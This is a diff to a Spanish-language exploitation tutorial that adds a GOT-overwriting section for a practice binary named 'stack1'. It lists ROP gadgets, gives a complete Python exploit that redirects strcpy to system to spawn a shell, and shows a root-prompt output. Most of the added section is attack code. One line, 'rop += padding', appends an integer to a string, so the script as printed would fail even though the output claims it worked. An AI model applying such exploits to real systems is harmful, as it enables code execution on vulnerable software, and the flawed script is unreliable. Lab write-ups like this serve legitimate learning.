@@ -450,6 +450,74 @@ Como no existe hay que crear un enlace  a sh desde esa cadena y meterle en el pa
   #
 ``` 
 
+**2.- GOT OVERWRITING**
+
+En este caso como sólo vamos a sobreescribir la posicón de memoria de la función strcpy con el valor de la función system, tendremos que usar menos instrucciones de ensamblador. En realidad nos bastaría con:
+
+```
+    (1) 0x8048545L: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+    (2) 0x804842bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+```
+
+Como ya tenemos los valores calculados anteriormente, y con lo bien que lo explica danigargu:
+"El gadget (1) colocará en EBX la dirección de la GOT de strcpy, y en EDI el offset entre system y strcpy. El (2) sumará el offset al contenido de la GOT de strcpy (dirección absoluta de strcpy), haciendo que apunte a system. Luego tan solo tendremos que llamar a la PLT de strcpy para invocar system, haciendo un ret2plt."
+
+Básicamente hay que escribir en la dirección GOT de strcpy el valor de strcpy + offset para llegar a system. Así quedaría el exploit:
+
+```python
+#!/usr/bin/python
+
+from struct import pack
+junk = "A" * 64 + "dcba" + "A" * 12  # 80 bytes
+
+## ROP gadgets ##
+gadget1 = pack('<I', 0x8048545) # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
+gadget2 = pack('<I', 0x804842b) # (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
+
+# OPERACIONES CONDICIONADAS POR LOS GADGETS
+
+padding = 0xcafedeef
+offset = 0xfffb3840 - 0x8				# El offset hay que calcularlo en gdb, no funciona lo anterior
+strcpy_got = (0x08049710-0x5d5b04c4) & 0xFFFFFFFF       # 0xaaa9924c = strcpy@GOT - 0x5d5b04c4 for the gadget (2)
+strcpy_plt = 0x08048368					# strcpy@PLT
+gnu_string = 0x8048154                          	# "GNU\x00" from note.gnu.build-id
+
+
+## PAYLOAD ##
+rop = gadget1                    # pop ebx ; pop esi ; pop edi ; pop ebp ;;
+rop += pack('<I', strcpy_got)    # EBX = strcpy@GOT - 0x5d5b04c4
+rop += pack('<I', padding)       # ESI = padding
+rop += pack('<I', offset)        # EDI = offset - 8
+rop += pack('<I', padding)       # EBP = padding
+ 
+rop += gadget2                   # EAX = OFFSET system-strcpy
+                                 # [ebx+0x5d5b04c4] (strcpy@GOT) + EAX = system
+ 
+rop += pack('<I', strcpy_plt)    # strcpy@PLT
+rop += padding                   # return address
+rop += pack('<I', gnu_string)    # "GNU" string
+ 
+payload = junk + rop
+ 
+print payload
+```
+
+Comprobamos que funciona:
+
+```
+/stack1 $(python gotover.py )you have correctly got the variable to the right value
+# exit
+Segmentation fault
+```
+
+
+
+
+
+
+
+
+
 
 El caso de cheer_msg (otro día...)
 
